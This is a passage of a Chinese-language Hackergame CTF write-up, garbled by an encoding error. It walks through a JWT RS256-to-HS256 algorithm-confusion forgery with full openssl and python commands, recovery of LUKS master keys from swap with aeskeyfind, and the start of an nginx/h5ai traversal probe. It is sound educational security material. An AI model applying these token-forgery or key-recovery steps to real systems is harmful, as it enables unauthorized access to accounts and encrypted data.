Signatureã€‚å°†è¿™ä¸‰æ®µä¿¡æ¯æ–‡æœ¬ç”¨.é“¾æ¥ä¸€èµ·å°±æ„æˆäº† JWT å­—ç¬¦ä¸²ã€‚ å‚è€ƒå®˜ç½‘ https://jwt.io/ ä»¥åŠ é˜®ä¸€å³°çš„ JSON Web Token å…¥é—¨æ•™ç¨‹ å†ç‚¹å‡» è·å–ç”¨æˆ·ä¿¡æ¯ æ—¶æŠŠè¿™ä¸ª jwt æ”¾åˆ° è¯·æ±‚å¤´çš„ Authorization å‚æ•°é‡Œï¼ŒåŒæ—¶ä¹Ÿå¸¦ä¸Š Hg-Token å³ä½ è‡ªå·± hackergame çš„ tokenã€‚ æ ¹æ®é¢˜ç›®æç¤ºï¼Œèº«ä»½è®¤è¯çš„ç‰ˆæœ¬ä¸Šæœ‰æ¼æ´ï¼ŒæŸ¥äº†ä¸€ä¸‹ã€‚ å‚è€ƒ JWT Attack Walk-Through ä¸€æ–‡ã€‚ Thereâ€™s a well-known defect [1] with older versions of certain libraries where you can trick a JSON Web Token (JWT) consumer that expects tokens signed using asymmetric cryptography into accepting a symmetrically signed token. This article assumes youâ€™re comfortable with JWTs and the theory of this attack, but the nub of it is that by switching the token algorithm from â€˜RSâ€™ to â€˜HSâ€™, a vulnerable endpoint will use its public key to verify the token in a symmetric way (and being public, that key isnâ€™t much of a secret). ç®€å•çš„è¯´å°±æ˜¯æŠŠ RS -&gt; HSï¼Œè€Œååç«¯å°±ç”¨å…¬é’¥å»éªŒè¯ tokenã€‚ å¦å¤–æ ¹æ® HTML é‡Œçš„æç¤ºï¼Œç³»ç»Ÿç”¨äº† FastAPI, Axios and Vue.jsã€‚ å…¶ä¸­ FastAPI è‡ªèº«å¸¦æœ‰ API æ–‡æ¡£ã€‚ åœ¨è¿™é¢˜ä¸­å°±æ˜¯ http://202.38.93.111:10092/docs ä»¥åŠ http://202.38.93.111:10092/redoc å‘ç°æœ‰ä¸€ä¸ª POST /debug çš„æ¥å£ï¼Œè¯·æ±‚ä¸€ä¸‹è¯•è¯•ã€‚ æ­£å¥½åˆé€‚ï¼Œè¿™åº”è¯¥å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„å…¬é’¥äº†ã€‚ -----BEGIN RSA PUBLIC KEY----- MIICCgKCAgEAn/KiHQ+/zwE7kY/Xf89PY6SowSb7CUk2b+lSVqC9u+R4BaE/5tNF eNlneGNny6fQhCRA+Pdw1UJSnNpG26z/uOK8+H7fMb2Da5t/94wavw410sCKVbvf ft8gKquUaeq//tp20BETeS5MWIXp5EXCE+lEdAHgmWWoMVMIOXwaKTMnCVGJ2SRr +xH9147FZqOa/17PYIIHuUDlfeGi+Iu7T6a+QZ0tvmHL6j9Onk/EEONuUDfElonY M688jhuAM/FSLfMzdyk23mJk3CKPah48nzVmb1YRyfBWiVFGYQqMCBnWgoGOanpd 46Fp1ff1zBn4sZTfPSOus/+00D5Lxh6bsbRa6A1vAApfmTcu026lIb7gbG7DU1/s eDId9s1qA5BJpzWFKO4ztkPGvPTUok8hQBMDaSH1JOoFQgfJIfC7w2CQe+KbodQL 3akKQDCZhcoA4tf5VC6ODJpFxCn6blML5cD6veOBPJiIk8DBRgmt2AHzOUju+5ns QcplOVxW5TFYxLqeJ8FPWqQcVekZ749FjchtAwPlUsoWIH0PTSun38ua8usrwTXb pBlf4r0wz22FPqaecvp7z6Rj/xfDauDGDSU4hmn/TY9Fr+OmFJPW/9k2RAv7KEFv FCLP/3U3r0FMwSe/FPHmt5fjAtsGlZLj+bZsgwFllYeD90VQU8Ds+KkCAwEAAQ== -----END RSA PUBLIC KEY----- æŠŠå…¬é’¥ä¿å­˜å¸¦ key.pem æ–‡ä»¶ä¸­ã€‚ è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œ**æ¢è¡Œç”¨çš„æ˜¯ \\nï¼Œå³åå…­è¿›åˆ¶çš„ 0Aï¼Œè€Œä¸æ˜¯ \\r\\n (0D0A)ã€‚ä¸”æœ€æœ«å°¾æœ‰ \\n**ã€‚ è½¬åå…­è¿›åˆ¶ã€‚ $ cat key.pem | xxd -p | tr -d \"\\\\n\" 2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a Payload é‡Œ åŠ å¯†ç®—æ³•ç”± RS256 é™çº§ä¸º HS256ï¼Œå†æ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œéœ€è¦æŠŠ guest æ”¹æˆ admin. {\"typ\":\"JWT\",\"alg\":\"HS256\"}.{\"sub\":\"admin\",\"exp\":1604399671} base64 ç¼–ç ä¸€ä¸‹ï¼Œä¸”å»æ‰ç»“å°¾çš„ =ï¼Œæ³¨æ„ä¸è¦ä¸¢æ‰ä¸­é—´çš„ .ã€‚ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0 ä¸‹é¢å¼€å§‹ç®—åŠ å¯†æ‰€ç”¨çš„ç­¾åï¼ˆSignatureï¼‰ã€‚ æŠŠä¸Šé¢å¾—åˆ°çš„è¯ä¹¦åŠ è½½è¿›æ¥ï¼Œç”¨ä»–æ¥åŠ å¯†ã€‚ $ echo -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d49494343674b43416745416e2f4b6948512b2f7a7745376b592f58663839505936536f7753623743556b32622b6c5356714339752b52344261452f35744e460a654e6c6e65474e6e79366651684352412b50647731554a536e4e704732367a2f754f4b382b4837664d6232446135742f39347761767734313073434b566276660a667438674b7175556165712f2f747032304245546553354d5749587035455843452b6c45644148676d57576f4d564d494f5877614b544d6e4356474a325352720a2b784839313437465a714f612f313750594949487555446c666547692b4975375436612b515a3074766d484c366a394f6e6b2f45454f4e75554466456c6f6e590a4d3638386a6875414d2f46534c664d7a64796b32336d4a6b33434b50616834386e7a566d6231595279664257695646475951714d43426e57676f474f616e70640a34364670316666317a426e34735a546650534f75732f2b303044354c786836627362526136413176414170666d5463753032366c496237676247374455312f730a65444964397331714135424a707a57464b4f347a746b5047765054556f6b386851424d44615348314a4f6f465167664a4966433777324351652b4b626f64514c0a33616b4b5144435a68636f41347466355643364f444a704678436e36626c4d4c3563443676654f42504a69496b38444252676d743241487a4f556a752b356e730a5163706c4f56785735544659784c71654a3846505771516356656b5a373439466a6368744177506c55736f57494830505453756e3338756138757372775458620a70426c66347230777a32324650716165637670377a36526a2f7866446175444744535534686d6e2f54593946722b4f6d464a50572f396b32524176374b4546760a46434c502f3355337230464d7753652f4650486d7435666a417473476c5a4c6a2b625a736777466c6c59654439305651553844732b4b6b434177454141513d3d0a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a (stdin)= 6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc æœ€åä¸€è¡Œå³å¾—åˆ°çš„ HMAC signature ç»“æœï¼Œå†å°†è¿™ä¸ª ASCII hex signature è½¬æ¢ä¸º JWT formatã€‚ =è¢«çœç•¥ã€+æ›¿æ¢æˆ-ï¼Œ/æ›¿æ¢æˆ_ ã€‚ï¼ˆBase64URL ç®—æ³•ï¼‰ Python çš„ä¸€è¡Œä»£ç å®ç°ã€‚ $ python -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('6b218e036017e7e9d3679add51314fe3fca177b2bdc0316b5944ac6aa965addc')).replace('=','')\\\")\" ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw æœ€åæ‹¼æ¥å¾—åˆ° JWTã€‚ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNDM5OTY3MX0.ayGOA2AX5-nTZ5rdUTFP4_yhd7K9wDFrWUSsaqllrdw æŠŠè¿™ä¸ªæ”¾åˆ° Authorization é‡Œã€‚åˆ«å¿˜äº† Hg-Tokenã€‚ æœ€åå¾—åˆ° flagã€‚ flag{just_A_simple_Json_Web_T0ken_exp1oit_xxxxx} å®¤å‹çš„åŠ å¯†ç¡¬ç›˜ï¼ˆå¤ç°ï¼‰ ã€Œæˆ‘çš„å®¶ç›®å½•æ˜¯ 512 ä½ AES åŠ å¯†çš„ï¼Œå°±ç®—ç”µè„‘ç»™åˆ«äººæˆ‘çš„ç§˜å¯†ä¹Ÿä¸ä¼šæ³„æ¼â€¦â€¦ã€ä½ çš„å®¤å‹åœ¨å€Ÿä½ çœ‹ä»–è£…ç€ Linux çš„æ–°ç”µè„‘æ—¶è¿™ä¹ˆè¯´é“ã€‚ä½ ä¸ä¿¡ï¼Œäºæ˜¯å·å·ä» U ç›˜å¯åŠ¨ï¼Œæ‹·å‡ºäº†ä»–ç¡¬ç›˜çš„ä¸€éƒ¨åˆ†å†…å®¹ã€‚ è§£å‹å‡ºæ¥ä¸€ä¸ª img æ–‡ä»¶ï¼Œé¦–å…ˆæ‹¿ WinHex çœ‹ä¸€ä¸‹ã€‚ åˆ†åŒº1é‡Œæœ‰ä¸ª keyfileï¼Œå†…å®¹ä¸º I'm not that stupid to put plaintext key in /boot! å•Šè¿™ã€‚ åˆ†åŒº2ä¸çŸ¥é“æ˜¯å•¥ã€‚ åˆ†åŒº3åº”è¯¥å°±æ˜¯éœ€è¦ç ´è§£çš„åŠ å¯†éƒ¨åˆ†äº†ã€‚ åˆ†åŒº4æ„Ÿè§‰åƒæ˜¯æ ¹ç›®å½•ï¼Œä¸å…¨ã€‚ ç„¶ååœ¨ Linux é‡Œæ‰”ç»™ fdisk çœ‹ä¸€ä¸‹ã€‚ $ fdisk roommates_disk_part.img Welcome to fdisk (util-linux 2.31.1). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): p Disk roommates_disk_part.img: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xa4ee910b Device Boot Start End Sectors Size Id Type roommates_disk_part.img1 * 2048 391167 389120 190M 83 Linux roommates_disk_part.img2 393214 16775167 16381954 7.8G 5 Extended roommates_disk_part.img5 393216 1890303 1497088 731M 82 Linux swap / Solaris roommates_disk_part.img6 1892352 3891199 1998848 976M 83 Linux roommates_disk_part.img7 3893248 16775167 12881920 6.1G 83 Linux å¯ä»¥çœ‹åˆ°æœ‰ swap äº¤æ¢åˆ†åŒºï¼Œä»¥åŠä¸å…¨çš„ Linux åˆ†åŒºï¼Ÿè€Œä¸”ç›´æ¥æŒ‚è½½ä¹ŸæŒ‚ä¸ä¸Šã€‚ æœäº†ä¸€ä¸‹ LUKS åŠ å¯†ç›¸å…³çš„æ–‡ç« ï¼Œæ‰¾åˆ°äº†å›½å¤–å¸ˆå‚…çš„ WriteUpï¼Œå‚è€ƒï¼š [Forensics] BsidesSF 2019 - goodluks2 [Forensics] BsidesSF 2019 - goodluks3 é¦–å…ˆç”¨ aeskeyfind è¿™ä¸ªå·¥å…·æ‰¾ä¸€æ‰¾ swap åˆ†åŒºé‡Œæœ‰æ²¡æœ‰æ®‹ç•™çš„ AES Keyã€‚å‘ç°æœç„¶æœ‰ï¼Œä½†æ˜¯ä¸€å †ã€‚ã€‚ ï¼ˆæœ¬æ¥åº”è¯¥å…ˆæŠŠè¿™å‡ ä¸ªåˆ†åŒºç”¨ dd ä¹‹ç±»å·¥å…·åˆ†å‰²ä¸€ä¸‹çš„ï¼Œä½†æˆ‘æ‡’äº†å˜¤å˜¤å˜¤ $ aeskeyfind roommates_disk_part.img e195501f5bf8fffe5f4c66c43249a5747875c98f9cb598c70f52a0d05f0601bc d913145b01b203ca068e48d2f40b048639d8c6f4cfe93b22c3795945ca9d9e2a 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f 457895c6ffa897807497bc31320cf9bff6707e176be26a1058fa49a12ccd2762 b895ea5154cea307a3f3891fd43f19c0d54ba38b8dd28519841fa818f24eaefb 082c4400a34b81dbc80de81874cf03ff16d97eb9380c515d3ec48e8433d7dc64 ef3b6d7b80e9ff8b13c8b801984d2c9cf6c0ca8dd342da98112f0c70f34fd5c8 4cdc0c14cb55bb435e75438b7d73f445ed5e90c9514b2d4264c753492bf847e8 9f3330a42a7f6446260df6e2f31d311e2fcfa3d6e1f4736e835b78e63c97ccc3 eab90394d3e9892c87a4b2f32144c71a2b1d2e0cdefce683125d695d6ed81d6c 37d7deb43c0223b8656dd6a862562a1a8360926278dc65f445eda2146844589f 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f 6bc77bd328b378315a193c7dfa0d14c2f023f5565564de40a6ba66d29aedfd3d 31c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769c e4d58f63d629f38803da3c712c5a0cc2be774b9d925d136024a181315d91ac99 136ce9ce0d3f130ebe629570a08bc2ea883e451533875140027d1b3fdb5d0091 31c69dff83847a6c3c3c091e4ff6113ca5799e1b63656f0bd51bd6490c20769c fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6 e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1 4c82f3493f9a3381f51c394ab8532bd037db64b793057aade3d6bf67cbebf933 fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6 e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1 Keyfind progress: 100% æˆ–è€…ç”¨ findaes è¿™ä¸ªå·¥å…·ã€‚ $ ./findaes roommates_disk_part.img Searching roommates_disk_part.img Found AES-256 key schedule at offset 0xc3ffde4: e1 95 50 1f 5b f8 ff fe 5f 4c 66 c4 32 49 a5 74 78 75 c9 8f 9c b5 98 c7 0f 52 a0 d0 5f 06 01 bc Found AES-256 key schedule at offset 0xc6529d8: d9 13 14 5b 01 b2 03 ca 06 8e 48 d2 f4 0b 04 86 39 d8 c6 f4 cf e9 3b 22 c3 79 59 45 ca 9d 9e 2a Found AES-256 key schedule at offset 0xc652b08: 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f Found AES-256 key schedule at offset 0xc652bfc: 45 78 95 c6 ff a8 97 80 74 97 bc 31 32 0c f9 bf f6 70 7e 17 6b e2 6a 10 58 fa 49 a1 2c cd 27 62 Found AES-256 key schedule at offset 0xc73bde4: b8 95 ea 51 54 ce a3 07 a3 f3 89 1f d4 3f 19 c0 d5 4b a3 8b 8d d2 85 19 84 1f a8 18 f2 4e ae fb Found AES-256 key schedule at offset 0xc7aade4: 08 2c 44 00 a3 4b 81 db c8 0d e8 18 74 cf 03 ff 16 d9 7e b9 38 0c 51 5d 3e c4 8e 84 33 d7 dc 64 Found AES-256 key schedule at offset 0xcbffde4: ef 3b 6d 7b 80 e9 ff 8b 13 c8 b8 01 98 4d 2c 9c f6 c0 ca 8d d3 42 da 98 11 2f 0c 70 f3 4f d5 c8 Found AES-256 key schedule at offset 0xfd13de4: 4c dc 0c 14 cb 55 bb 43 5e 75 43 8b 7d 73 f4 45 ed 5e 90 c9 51 4b 2d 42 64 c7 53 49 2b f8 47 e8 Found AES-256 key schedule at offset 0x101efde4: 9f 33 30 a4 2a 7f 64 46 26 0d f6 e2 f3 1d 31 1e 2f cf a3 d6 e1 f4 73 6e 83 5b 78 e6 3c 97 cc c3 Found AES-256 key schedule at offset 0x110d5de4: ea b9 03 94 d3 e9 89 2c 87 a4 b2 f3 21 44 c7 1a 2b 1d 2e 0c de fc e6 83 12 5d 69 5d 6e d8 1d 6c Found AES-256 key schedule at offset 0x1337c9d8: 37 d7 de b4 3c 02 23 b8 65 6d d6 a8 62 56 2a 1a 83 60 92 62 78 dc 65 f4 45 ed a2 14 68 44 58 9f Found AES-256 key schedule at offset 0x1337cb08: 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f Found AES-256 key schedule at offset 0x1337cbfc: 6b c7 7b d3 28 b3 78 31 5a 19 3c 7d fa 0d 14 c2 f0 23 f5 56 55 64 de 40 a6 ba 66 d2 9a ed fd 3d Found AES-256 key schedule at offset 0x14e67de4: 31 c6 9d ff 83 84 7a 6c 3c 3c 09 1e 4f f6 11 3c a5 79 9e 1b 63 65 6f 0b d5 1b d6 49 0c 20 76 9c Found AES-256 key schedule at offset 0x1618ca1a: e4 d5 8f 63 d6 29 f3 88 03 da 3c 71 2c 5a 0c c2 be 77 4b 9d 92 5d 13 60 24 a1 81 31 5d 91 ac 99 Found AES-256 key schedule at offset 0x1618cc0e: 13 6c e9 ce 0d 3f 13 0e be 62 95 70 a0 8b c2 ea 88 3e 45 15 33 87 51 40 02 7d 1b 3f db 5d 00 91 Found AES-256 key schedule at offset 0x1632db50: 31 c6 9d ff 83 84 7a 6c 3c 3c 09 1e 4f f6 11 3c a5 79 9e 1b 63 65 6f 0b d5 1b d6 49 0c 20 76 9c Found AES-256 key schedule at offset 0x171c873a: fa 01 a9 80 89 a3 8f 60 6c 14 86 94 e7 a3 50 9a ac cf c1 65 06 8e d6 7f 57 15 38 4b 93 e5 6a a6 Found AES-256 key schedule at offset 0x171c890d: e4 58 16 75 c3 f9 47 f7 b5 37 a3 dd 60 98 e4 a5 89 8b 0a 18 c2 b3 b0 f6 75 c6 1d e4 10 6f c6 a1 Found AES-256 key schedule at offset 0x17d08b20: 4c 82 f3 49 3f 9a 33 81 f5 1c 39 4a b8 53 2b d0 37 db 64 b7 93 05 7a ad e3 d6 bf 67 cb eb f9 33 Found AES-256 key schedule at offset 0x19013349: fa 01 a9 80 89 a3 8f 60 6c 14 86 94 e7 a3 50 9a ac cf c1 65 06 8e d6 7f 57 15 38 4b 93 e5 6a a6 Found AES-256 key schedule at offset 0x1901351c: e4 58 16 75 c3 f9 47 f7 b5 37 a3 dd 60 98 e4 a5 89 8b 0a 18 c2 b3 b0 f6 75 c6 1d e4 10 6f c6 a1 ç”¨ losetup å°†ç£ç›˜é•œåƒæ–‡ä»¶è™šæ‹Ÿæˆ loop è®¾å¤‡ã€‚ è¿™é‡Œç”¨ç¬¬ä¸‰ä¸ªåˆ†åŒºï¼Œèµ·å§‹çš„åç§»ä¸º 1892352 * 512 = 968884224 bytesã€‚ å¾ªç¯è®¾å¤‡å¯æŠŠæ–‡ä»¶è™šæ‹ŸæˆåŒºå—è®¾å¤‡ï¼Œç±ä»¥æ¨¡æ‹Ÿæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè®©ç”¨æˆ·å¾—ä»¥å°†å…¶è§†ä¸ºç¡¬ç›˜é©±åŠ¨å™¨ï¼Œå…‰é©±æˆ–è½¯é©±ç­‰è®¾å¤‡ï¼Œå¹¶æŒ‚å…¥å½“ä½œç›®å½•æ¥ä½¿ç”¨ã€‚ sudo losetup --offset 968884224 /dev/loop30 roommates_disk_part.img ç„¶åå¯ä»¥ç”¨ ls /dev/loop* çœ‹åˆ°æœ‰ loop30 äº†ã€‚ éšæ„æŠŠä¸€è¡Œçš„ AES Key æ‹¿å»è§£å¯†ï¼Œå‘ç°ä¹Ÿæ˜¯æç¤º Cannot read 64 bytes from keyfile key0. é¢˜ç›®æç¤º AES512ï¼Œè¿™é‡Œè§£å¯†å‡ºæ¥çš„ AES256 å¯†é’¥é•¿åº¦ä¸å¤Ÿã€‚äºæ˜¯å°±å¾—æŠŠä¸¤ä¸ªæ‹¼ä¸€èµ·æ‹¿å»è§£å¯†ï¼Œè€Œä¸”ç†è®ºä¸Šåº”è¯¥æ˜¯ä¸¤ä¸ªè¿ç»­çš„å¯†é’¥æ‹¼ä¸€èµ·ã€‚ ç„¶è€Œæˆ‘å°±å¡è¿™é‡Œäº†ã€‚åªæƒ³åˆ°æ­£ç€æ‹¼æ¥ï¼Œæ²¡æƒ³åˆ°åè¿‡æ¥è¿æ¥ã€‚ã€‚ å‚è€ƒå®˜æ–¹ WP ç»™çš„ Breaking Full Disk Encryption from a Memory Dump ä¸€æ–‡ï¼Œç”±äºç”¨çš„æ˜¯å°ç«¯åºï¼Œè¿™é‡Œåº”è¯¥åè¿‡æ¥æ‹¼æ¥ã€‚ è¯•äº†åŠå¤©å‘ç°æ˜¯æœ€åä¸¤æ¡ï¼Œè€Œä¸”è¿˜å‡ºç°äº†ä¸¤æ¬¡ã€‚ echo 'e4581675c3f947f7b537a3dd6098e4a5898b0a18c2b3b0f675c61de4106fc6a1fa01a98089a38f606c148694e7a3509aaccfc165068ed67f5715384b93e56aa6' | xxd -r -p &gt; key0 ç„¶åç”¨ key0 å»è§£å¯†é•œåƒã€‚ sudo cryptsetup luksOpen --master-key-file key0 /dev/loop30 decrypted æ²¡æœ‰æŠ¥é”™ï¼Œç„¶åå†æŠŠè¿™ä¸ª loop ç»™æŒ‚è½½ä¸Šã€‚æœ€åè¿›å»æ‹¿åˆ° flagã€‚ sudo mkdir /mnt/hackergame sudo mount /dev/mapper/decrypted /mnt/hackergame cd /mnt/hackergame/ # ... cat flag.txt æœ€åå†å–æ¶ˆæŒ‚è½½ï¼Œå¸è½½ loop è®¾å¤‡ã€‚æœ‰å§‹æœ‰ç»ˆå˜›ã€‚ sudo umount /mnt/hackergame sudo losetup -d /dev/loop30 sudo rm -rf /mnt/hackergame å…¶ä»– References &amp; Extensive Readingï¼š Forensics CTF challenge - FBiOS writeup Hack.lu CTF 2015 - Forensics 150: Dr. Bob Writeupï¼ˆè¾ƒç®€å•ï¼‰ AES â€“ Symmetric Ciphers Online ä¸€ä¸ªåœ¨çº¿çš„ AES è§£å¯†ç½‘ç«™ è¿…é›·ç½‘å¿ƒäº‘x86ç‰ˆè™šæ‹Ÿæœºç¡¬ç›˜è§£å¯† è¶…ç®€æ˜“çš„ç½‘ç›˜æœåŠ¡å™¨ ç™»å½•äº†æœåŠ¡å™¨åå°çš„å° C å¼€å§‹æ€è€ƒæŠ€æœ¯æ–¹æ¡ˆï¼šâ€œå¬è¯´ h5ai æ­å»ºäº‘ç›˜çš„æ–¹æ¡ˆæ˜¯ä¸é”™çš„ â€¦ ä½¿ç”¨ Basic Auth å¯ä»¥åšè®¿é—®æ§åˆ¶ï¼Œå¯ä»¥ä¿æŠ¤æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸è¢«éæ³•çš„è®¿é—® â€¦ ç­‰ç­‰ï¼Œæœ‰ä¸€äº›æ–‡ä»¶æ˜¯å¯ä»¥è¢«åˆ†äº«çš„ï¼Œéœ€è¦ä¸€ä¸ª /Public ç›®å½•æ¥å…±äº«æ–‡ä»¶ï¼â€ ä¸‰åˆ†é’Ÿåï¼Œå° C åŒå­¦å®Œæˆäº†ç½‘ç›˜çš„æ­å»ºã€‚ä»–æƒ³ï¼šâ€œç©ºç€æ€»ä¸å¥½ï¼Œå…ˆå¾—åœ¨äº‘ç›˜ä¸Šæ”¾ç‚¹ä¸œè¥¿ï¼â€ã€‚çŠ¹è±«ç‰‡åˆ»ï¼Œä»–æå‡ºäº†è‡ªå·±çè—äº†ä¸‰ä¸ªæœˆçš„ flag å¹¶ä¸Šä¼ åˆ°äº†äº‘ç›˜çš„æ ¹ç›®å½•ã€‚ è¿™é¢˜è€é¦‹äº†ï¼Œåšäº†å¥½ä¹…æ‰æ•´å‡ºæ¥ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œæˆ‘è‡ªå·±çˆ¬ã€‚ è®¿é—® /Public ç›®å½•ï¼Œå¯ä»¥å¾—åˆ° nginx.conf ä»¥åŠ Dockerfileã€‚ å…³é”®ä»£ç ï¼š FROM alpine:latest EXPOSE 10120 WORKDIR /var/www/html RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \\ &amp;&amp; apk add nginx supervisor php7-fpm php7-session php7-json php7-gd php7-exif git wget unzip zip\\ &amp;&amp; mkdir -p /var/www/html/Public \\ &amp;&amp; wget https://release.larsjung.de/h5ai/h5ai-0.29.2.zip \\ &amp;&amp; unzip h5ai-0.29.2.zip \\ &amp;&amp; cp -rp /var/www/html/_h5ai /var/www/html/Public/_h5ai \\ &amp;&amp; rm h5ai-0.29.2.zip \\ &amp;&amp; mkdir /run/nginx ADD ./supervisord.conf /etc/supervisor/conf.d/supervisord.conf ADD ./nginx.conf /etc/nginx/nginx.conf ADD ./php.ini /etc/php7/php.ini RUN rm /etc/nginx/conf.d/default.conf RUN chown -R nobody.nobody /var/www/html &amp;&amp; \\ chown -R nobody.nobody /run &amp;&amp; \\ chown -R nobody.nobody /var/lib/nginx &amp;&amp; \\ chown -R nobody.nobody /var/log/nginx &amp;&amp; \\ chown -R nobody.nobody /var/log/php7 USER nobody ADD --chown=nobody ./flag.txt /var/www/html/ ADD --chown=nobody ./dockerfile ./nginx.conf /var/www/html/Public/ CMD [\"/usr/bin/supervisord\", \"-c\", \"/etc/supervisor/conf.d/supervisord.conf\"] cp -rp /var/www/html/_h5ai /var/www/html/Public/_h5aiï¼Œè¿™é‡Œçœ‹å¾—å‡ºæ¥**æœ‰ä¸¤ä¸ª _h5ai**ï¼Œå®é™…è®¿é—®ä¹Ÿæ˜¯ã€‚ server{ # Docker å†…éƒ¨çš„åœ°å€ï¼Œæ— å…³ç´§è¦ listen 10120; server_name _; root /var/www/html; index index.php index.html /_h5ai/public/index.php; # _h5ai/private æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹æ˜¯ä¸å¯ç›´æ¥è®¿é—®çš„ï¼Œè®¾ç½®å±è”½ location ~ _h5ai/private { deny all; } # æ ¹ç›®å½•æ˜¯ç§æœ‰ç›®å½•ï¼Œä½¿ç”¨ basic auth è¿›è¡Œè®¤è¯ï¼Œåªæœ‰æˆ‘ï¼ˆè¶…æè‡´çš„å° C)è‡ªå·±å¯ä»¥è®¿é—® location / { auth_basic \"easy h5ai. For visitors, please refer to public directory at `/Public!`\"; auth_basic_user_file /etc/nginx/conf.d/htpasswd; } # Public ç›®å½•æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥è®¿é—®ï¼Œä¾¿äºæˆ‘ç»™å¤§å®¶åˆ†äº«æ–‡ä»¶ location /Public { allow all; index /Public/_h5ai/public/index.php; } # PHP çš„ fastcgi é…ç½®ï¼Œå°†è¯·æ±‚è½¬å‘ç»™ php-fpm location ~ \\.php$ { fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } location ~ /\\. { log_not_found off; deny all; } } ï¼ˆæä¸€å¥ï¼Œè¿™ä¸ªå¯†é’¥æ–‡ä»¶è¯´ä¸å¥½è¿˜ä¸å­˜åœ¨ï¼ˆx ï¼ˆæœ¬åœ°æ­å»ºå°±æ˜¯è¿™æ ·ï¼Œä½†ä¸å½±å“é¢˜ç›®ã€‚ åˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯ Nginx é…ç½®é—®é¢˜ï¼Œå¯èƒ½è·¯å¾„ç©¿è¶Šï¼Œä¾‹å¦‚ /Public../ï¼Œä½†ä¸çŸ¥é“è·‘å“ªå»äº† æœ¬åœ°æ­å»ºè¯•äº†è¯•ï¼Œçš„ç¡®è·¯ç”±åˆ° /Public../ ç›®å½•ä¸‹äº†ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥åˆ—ä¸å‡ºæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸‹è½½å€’æ˜¯å¯ä»¥çš„ã€‚ å¯èƒ½æ˜¯éœ€è¦è®¾ç½® aliasï¼Œå¼€å¯ autoindexï¼Œæ‰ä¼šæœ‰è¿™ä¸ªæ¼æ´å§ã€‚ å†æƒ³æƒ³ï¼Œéš¾é“æ˜¯ php-fpmåœ¨nginxç‰¹å®šç¯å¢ƒä¸‹çš„ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-11043ï¼‰ï¼Ÿï¼ˆGitHub **phuip-fpizdam**ï¼‰ 